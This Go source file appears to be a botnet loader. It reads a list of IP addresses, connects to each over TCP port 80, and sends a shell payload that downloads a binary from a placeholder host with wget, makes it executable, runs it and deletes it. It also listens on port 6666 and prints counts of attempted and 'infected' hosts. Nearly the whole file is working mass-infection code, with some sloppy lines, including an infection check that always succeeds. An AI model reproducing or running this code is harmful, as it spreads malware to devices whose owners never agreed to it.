package main

import (
    "bufio"
    "fmt"
    "net"
    "os"
    "strings"
    "sync"
    "time"
)

var payload string = `
cd /dev

wget http://IP_ADDRESS_HERE/x86_64
chmod 777 x86_64
./x86_64
rm -rf x86_64 > success
return success

# DO SAME TO ALL OTHER BINS


/var/wii 2>/dev/null &
`

var dirChange, statusAttempted, statusInfected, echoDropped, statusFailed int
var wg sync.WaitGroup

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func loaderThread(conn net.Conn) {
    defer conn.Close()
    buf := make([]byte, 512)
    conn.SetWriteDeadline(time.Now().Add(60 * time.Second))

    conn.Write([]byte(payload))

    statusAttempted++
    conn.SetReadDeadline(time.Now().Add(30 * time.Second))
    for {
        le, err := conn.Read(buf)
        if err != nil || le <= 0 {
            break
        }

        if strings.Contains(string(buf), "") {
            statusInfected++
            break
        }
    }

    zeroByte(buf)
    return
}

func connectAndSend(ip string) {
    defer wg.Done()
    conn, err := net.DialTimeout("tcp", ip+":80", 10*time.Second)
    if err != nil {
        //fmt.Printf("Failed to connect to %s\n", ip) spammy
        return
    }
    go loaderThread(conn)
}

func main() {
    if len(os.Args) != 2 {
        fmt.Println("Usage: go run main.go <ips.txt>")
        return
    }

    file, err := os.Open(os.Args[1])
    if err != nil {
        fmt.Printf("Failed to open file: %s\n", err)
        return
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        ip := scanner.Text()
        wg.Add(1)
        go connectAndSend(ip)
    }

    if err := scanner.Err(); err != nil {
        fmt.Printf("Failed to read file: %s\n", err)
        return
    }

    li, err := net.Listen("tcp", "0.0.0.0:6666")
    if err != nil {
        return
    }

    var i int = 0
    go func() {
        for {
            fmt.Printf("%d's | Attempted %d | Infected %d\r\n", i, statusAttempted, statusInfected)
            time.Sleep(1 * time.Second)
            i++
        }
    }()

    go func() {
        for {
            conn, err := li.Accept()
            if err != nil {
                break
            }

            go loaderThread(conn)
        }
    }()

    wg.Wait()

    for {
        time.Sleep(1 * time.Second)
    }
}
